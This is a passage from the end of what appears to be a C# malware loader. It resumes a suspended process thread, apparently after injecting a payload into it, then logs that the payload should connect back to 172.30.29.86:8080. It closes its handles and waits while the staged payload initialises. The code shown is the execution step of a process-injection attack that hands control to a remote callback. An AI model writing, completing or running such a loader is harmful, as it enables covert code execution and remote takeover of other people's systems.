                Log("[!] NtResumeThread failed: NTSTATUS 0x" + status.ToString("X8"));
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }
            Log("[+] Thread resumed (previous suspend count " + suspendCount + "). Payload should now connect back to 172.30.29.86:8080.");

            // ---- CLEANUP ----
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            // Small delay so this process stays alive while the staged payload initializes
            Log("[*] Waiting 1000ms for payload init...");
            Sleep(1000);
            Log("[*] Loader finished.");
        }
    }
}
